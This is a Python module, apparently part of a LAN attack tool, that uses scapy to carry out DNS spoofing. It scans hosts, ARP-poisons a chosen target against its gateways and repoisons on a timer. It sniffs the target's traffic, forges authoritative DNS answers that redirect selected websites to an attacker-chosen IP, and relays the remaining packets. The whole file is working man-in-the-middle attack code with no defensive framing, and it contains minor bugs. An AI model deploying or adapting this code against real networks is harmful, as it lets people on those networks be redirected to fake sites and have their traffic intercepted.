### IMPORTS ###

from scapy.all import *
from scapy.layers.http import HTTPRequest
import netifaces as ni
import time
import re

# import other files from project
import search_hosts as sh
import arp_spoofing as arp
import spoofing_tool as spoof


## REGEX FOR CHECKING URL VALIDITY ##
regex = re.compile(
        r'^(?:http|ftp)s?://' # http:// or https://
        r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|' #domain...
        r'localhost|' #localhost...
        r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})' # ...or ip
        r'(?::\d+)?' # optional port
        r'(?:/?|[/?]\S+)$', re.IGNORECASE)


### CONSTANTS ###

END_POISON = int(200) # number of packets sent during repoisoning
REPOISON_TIME = int(20) # interval of repoisoning


### FUNCTIONS ###

# Main function that runs the DNS attack
def dns_spoofing(gratuitious, verbose):
    if verbose:     
        conf.verb = 0 # make scapy verbose (no output)

    # clear terminal and begin keeping track of previous displayed text for UI
    spoof.clear()
    previous_tuples = []

    # disable ip forwarding
    spoof.should_ip_forward(False)
    previous_tuples.append(["IP forwarding disabled!"])
    previous_tuples.append([""])

    previous_tuples.append(["Chosen attack: DNS Spoofing.", 0])
    previous_tuples.append(["----------------------------"])

    # allow the user to choose an interface for the attack
    iface, previous_tuples = spoof.get_interface(previous_tuples)
    spoof.print_previous(previous_tuples, True)

    # search for active hosts on the network
    active_hosts, previous_tuples = sh.search_hosts(iface, [])

    spoof.printf("")
    previous_tuples.append([""])
    spoof.printf("Input the IP address of the target out of the active hosts("+str(1)+"-"+str(len(active_hosts))+"):", 1)
    previous_tuples.append(["Input the IP address of the target out of the active hosts("+str(1)+"-"+str(len(active_hosts))+"):", 1])

    # get the target's ip and mac address from the user's input 
    target = spoof.validate_ip(active_hosts, [], previous_tuples)

    # get the IP addresses of the default gateways of the selected interface
    gateways = {}
    GATEWAY_TOKEN = "ff:ff:ff:ff:ff:ff"
    for key, val in ni.gateways()["default"].items():
        if val[1] == iface:
            gateways[str(val[0])] = GATEWAY_TOKEN

    for host in active_hosts:
        if host["ip"] in gateways:
            # add the MAC addresses of the gateways
            gateways[host["ip"]] = host["mac"]

            # check for other active hosts that have MAC addresses equal to a MAC address of a default gateway
            # and add them to the gateways for spoofing
            for scnd_host in active_hosts:
                if scnd_host["mac"] == host["mac"] and scnd_host["ip"] not in gateways:
                    gateways[scnd_host["ip"]] = scnd_host["mac"]

    # remove gateways for which no MAC address was found
    for gw_ip, gw_mac in gateways.items():
        if gw_mac == GATEWAY_TOKEN:
            gateways.pop(gw_ip)                

    previous_tuples = []
    to_print = "Chosen target IP address: " + target["ip"]
    previous_tuples.append([to_print, 0])
    previous_tuples.append(["-" * len(to_print)])

    # pick which websites to spoof and with what ip
    dns_hosts = choose_websites(active_hosts, previous_tuples).copy()
    
    spoof.clear()
    spoof.printf("Chosen websites and targets:", 0)

    i = 1
    for url, ip in dns_hosts.items():
        spoof.printf("\t"+ str(i) + ". URL: " + url[:-1] + " \tIP: " + ip)
        i+=1

    spoof.printf("")
    spoof.printf("Starting poisoning... (Use Ctrl+Z to stop and kill the program)", 4)

    # start ARP poisoning every combination of target and gateway
    my_addresses = sh.get_my_details(iface)
    for gw_ip, gw_mac in gateways.items():
        arp.one_way_arp_start(target["mac"], target["ip"], gw_ip, my_addresses['mac'], my_addresses['ip'], iface)

    spoof.printf("Poisoning initiated.", 4)

    # run the main function for dns spoofing
    dns_spoof_and_repoison(my_addresses, gateways, target, iface, dns_hosts, gratuitious, END_POISON)

    # end ARP poisoning by unpoisoning the tables of all targets with the correct mac addresses of gateways
    for gw_ip, gw_mac in gateways.items():
        for host in active_hosts:
            if host['ip'] == gw_ip:
                arp.one_way_arp_end(target["mac"], target["ip"], host['mac'], host['ip'], my_addresses['mac'], my_addresses['ip'], iface)
                break

# Function for inputting websites that should be dns poisoned
#
# @return a dictionary with url as keys and ip's as values
def choose_websites(active_hosts, previous_tuples):
    
    # initiate needed variables
    dns_hosts = {} # dictionary to be returned
    _iter = 0 # keeps track of current target's index
    continue1 = True 
    continue2 = True

    previous_tuples.append(["Now you can choose which websites to spoof and with what IP out of the active hosts("+str(1)+"-"+str(len(active_hosts))+"):"])
    previous_tuples = sh.print_active_hosts(active_hosts, 0, 0, previous_tuples, False)
    previous_tuples.append(["You can pick multiple times. Type 'd' when done choosing."])
    previous_tuples.append([""])
    previous_tuples.append(["Choose website to spoof and its corresponding IP out of the active hosts("+str(1)+"-"+str(len(active_hosts))+"):", 1])
    
    while continue1 and continue2:
        spoof.clear()
        spoof.print_previous(previous_tuples, True)

        # get the current chosen url
        url, continue1 = input_web("URL: ", _iter, True, active_hosts, previous_tuples)
        if continue1:
            # get the current chosen ip 
            ip, continue2  = input_web(" IP: ", _iter, False, active_hosts, previous_tuples)
        _iter += 1
        if continue1 and continue2:
            # add the url and ip to the dictionary
            # with format www.{example.com} and {example.com}
            dns_hosts[url+"."] = ip

            if url[:4] == "www.":
                dns_hosts[url[4:]+"."] = ip
            else:
                dns_hosts["www."+url+"."] = ip

            spoof.printf("")
            spoof.printf("Added tuple (" + url + ", " + ip + ")", 0)
            time.sleep(0.5)

    return dns_hosts

# Fucntion for getting the input for website url and corresponding ip's
#
# @return the input of the user and boolean value showing whether the program should continue choosing websites
def input_web(eend, _iter, isURL, active_hosts, previous_tuples):
    # get the user's ip
    res = spoof.inputf(previous_tuples, eend)

    # on input for stopping the choosing of websites
    if res in ["d", "done"]:
        if _iter < 1:
            # force the user to input the website, ip tuple if it is the first one
            spoof.printf("You chould choose at least one (URL, IP) pair!", 2)
            return input_web(eend, _iter, isURL, active_hosts, previous_tuples)
        else:
            # otherwise return the input of the user and stop choosing
            return res, False

    # user should input url
    if isURL:
        if not is_URL_valid(res):
            # if the url is not valid => repeat this procedure
            spoof.printf("Invalid URL({})! Try again.".format(res), 2)
            return input_web(eend, _iter, isURL, active_hosts, previous_tuples)
        else:
            # if the url is valid => return
            return res, True

    # user should input ip         
    else:
        # check for validity of the ip
        ip, valid = is_IP_valid(active_hosts, res)
        if not valid:
            # if the ip is not valid => repeat this procedure
            spoof.printf("Invalid IP({})! Try again.".format(ip), 2)
            return input_web(eend, _iter, isURL, active_hosts, previous_tuples)
        else:
            # if the ip is valid => return
            return ip, True
# Function for checking if a URL is formatted correctly using regular expressions
def is_URL_valid(string):
    return re.match(regex, "http://" + string) is not None

# Function for checking if an ip formatted correctly and is part of the active hosts
def is_IP_valid(active_hosts, ip_address):
    try:
        # check if the ip is part of the active hosts
        ip_address = active_hosts[int(ip_address) - 1]["ip"]
        return ip_address, True
    except:
        # check the ip using regular expressions
        match = re.match(r"^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$", ip_address)
        if bool(match) is False:
            return ip_address, False

        for part in ip_address.split("."):
            if int(part) < 0 or int(part) > 255:
                return ip_address, False

        return ip_address, True

# Function for dns spoofing the connection between the target and the chosen urls
#
# @param dns_hosts  dictionary containing tuples for websites to spoof and with which ip
# @param gratuitious whether the ARP poisoning should be silent (False) or all-out (True)
def dns_spoof_and_repoison(my_addresses, gateways, target, iface, dns_hosts, gratuitious, end_poison):
        # filter for sniffing only packets that are from/to the target
        _filter = "host " + target["ip"]

        # create a socket for sending the packets using scapy faster 
        s2 = conf.L2socket(iface=iface)

        # number of times to keep poisoning
        for i in range(end_poison):
            # get all packets that adhere to the {_filter} for {REPOISON_TIME} seconds
            # if a packet is found => process it using the function {process_pkt}
            sniff(prn=process_pkt(target, iface, dns_hosts, my_addresses, gateways, s2), filter=_filter, store=0, timeout=REPOISON_TIME)   
            
            # {REPOISON_TIME} seconds have passed => should repoison
            repoison(my_addresses, gateways, target, iface, gratuitious)

        # close the socket at the end of the procedure
        s2.close()

# Function for repoisong the arp table of the target for each gateway
def repoison(my_addresses, gateways, target, iface, gratuitious):
    spoof.printf("Repoisoning", 4)
    for gw_ip, gw_mac in gateways.items():
        arp.one_way_arp(target["mac"], target["ip"], gw_ip, my_addresses['mac'], my_addresses['ip'], iface, 2, gratuitious)

# Function for proccessing sniffed packets
#
# @param s2 - the scapy socket on which packets should be sent
def process_pkt(target, iface, dns_hosts, my_addresses, gateways, s2):
    # inner function which gets the packet as parameter 
    def process_pkt_inner(pkt): 
        # check that the packet is at least Layer 3 packet
        if pkt.haslayer(IP):
            # the packet is for the target and about one of the websites that should be spoofed
            if pkt.haslayer(DNS) and pkt[IP].src == target['ip'] and pkt[DNSQR].qname in dns_hosts:
                spoof.printf("Found DNS query from " + pkt[IP].src + " for " + pkt[DNSQR].qname + " Spoofing response.", 5)

                # build a spoofed response and return dlit to the target
                resp_packet = build_dns_response_packet(pkt, dns_hosts[pkt[DNSQR].qname])
                s2.send(resp_packet)

            # elif pkt[IP].src == target['ip'] and pkt.haslayer(HTTPRequest):
                # if pkt[HTTPRequest].Method == "GET" and pkt[HTTPRequest].Path == "/":
                #     print("Initial get request for " + pkt[HTTPRequest].Host)

            # the received packet is not for a website we care about
            elif pkt[IP].src == target['ip']:
                if pkt.haslayer(HTTPRequest) and pkt[HTTPRequest].Method == "GET" and pkt[HTTPRequest].Path == "/":
                    print("Initial get request for " + pkt[HTTPRequest].Host)
                    pkt[Ether].src = str(my_addresses['mac'])
                    pkt[IP].src = str(my_addresses['ip'])
                    del pkt[TCP].chksum 

                    url = pkt[HTTPRequest].Host
                    port = pkt[TCP].dport
                    s=socket.socket()
                    s.connect((url,port))
                    ss = StreamSocket(s,Raw)
                    ss.sr1(Raw('GET /\r\n'))
                    # input()
                    # print(pkt.show())

                # unspoof the mac address to point to the gateway
                for gw_ip, gw_mac in gateways.items():
                    pkt[Ether].dst = gw_mac
                    break

                # delete the checksum and length fields of the IP layer if needed
                if pkt.haslayer(IP):
                    del pkt[IP].len
                    del pkt[IP].chksum

                # delete the checksum and length fields of the UDPl layer if needed
                if pkt.haslayer(UDP):
                    del pkt[UDP].len
                    del pkt[UDP].chksum

                # send the packet through the socket 
                # this function automatically recalculates the checksum and length fields of all needed layers
                
                s2.send(pkt)

    # call the inner function
    return process_pkt_inner

# Function that builds a reply packet to a dns request
#
# @param pkt - dns request packet
# @param malicious_ip - ip that should be spoofed
# @return the spoofed reply packet
def build_dns_response_packet(pkt, malicious_ip):
        # Layer 2 header
        eth = Ether(src = pkt[Ether].dst,
                    dst = pkt[Ether].src)

        # Layer 3 header
        ip = IP(src = pkt[IP].dst,
                dst = pkt[IP].src)

        # Layer 4 header
        udp = UDP(dport = pkt[UDP].sport,
                  sport = pkt[UDP].dport)

        # Layer 5 header
        dns = DNS(id = pkt[DNS].id,
                  qd = pkt[DNS].qd,
                  aa = 1,
                  rd = 0,
                  qr = 1,
                  qdcount = 1,
                  ancount = 1,
                  nscount = 0,
                  arcount = 0,
                  ar = DNSRR(
                        rrname = pkt[DNS].qd.qname,
                        type = 'A',
                        ttl = 690,
                        rdata = malicious_ip))

        # assemble the packet
        new_pkt = eth / ip / udp / dns
        return new_pkt